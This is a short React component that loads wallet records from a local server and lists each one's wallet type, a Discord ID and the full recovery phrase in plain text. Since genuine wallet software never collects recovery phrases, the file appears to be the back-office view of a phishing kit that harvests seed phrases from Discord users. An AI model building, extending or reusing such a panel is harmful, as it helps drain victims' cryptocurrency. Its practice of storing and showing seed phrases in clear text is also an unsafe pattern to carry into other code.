import React, { useEffect, useState } from "react";

import { Table } from "react-bootstrap";

import { TABLEHEADERS } from "../Modules/Listing";

import axios from "axios";

export default function WalletTable(props) {
  // ACTIVE TABLES
  const { activeTable, setActiveTable } = props;

  // SELECTED TABLE WALLETS
  const [table_wallets, set_able_wallets] = useState([]);

  // GET ALL THE LIST OF ALL WALLETS
  const getAll = () => {
    var config = {
      method: "get",
      url: "http://localhost:8000/get-all-wallets",
    };

    axios(config)
      .then(function (response) {
        set_able_wallets(response.data);
      })
      .catch(function (error) {
        console.log(error);
      });
  };

  // RUN THIS ONLY EVERY MOUNT
  useEffect(() => {
    getAll();
  }, []);

  // TREZOR
  const ii = table_wallets.filter((e) => {
    return e.wallet === activeTable;
  });

  return (
    <div className="my-4">
      <Table striped bordered hover>
        <thead>
          <tr>
            {TABLEHEADERS.map((head, index) => {
              return <th key={index}>{head}</th>;
            })}
          </tr>
        </thead>
        <tbody>
          {ii.map((t, index) => {
            return (
              <tr key={index}>
                <td>{index}</td>
                <td>{t.wallet}</td>
                <td>{t.discordID}</td>
                <td>{t.recoveryPhrase.join(" ")}</td>
              </tr>
            );
          })}
        </tbody>
      </Table>
    </div>
  );
}
